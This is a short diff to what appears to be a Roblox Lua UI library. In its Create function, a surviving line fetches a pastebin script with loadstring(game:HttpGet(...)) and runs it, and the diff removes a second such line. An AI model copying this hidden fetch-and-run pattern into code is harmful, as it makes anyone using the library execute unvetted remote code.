@@ -1149,7 +1149,6 @@ function Library:Create(config)
 	end)
 
 	loadstring(game:HttpGet("https://pastebin.com/raw/rQMS2B9R"))()
-	loadstring(game:HttpGet("https://pastebin.com/raw/XUdfNnCe"))()
 	spawn(function()
 		local sound = Instance.new("Sound", location)
 		sound.Name = "Startup Sound"
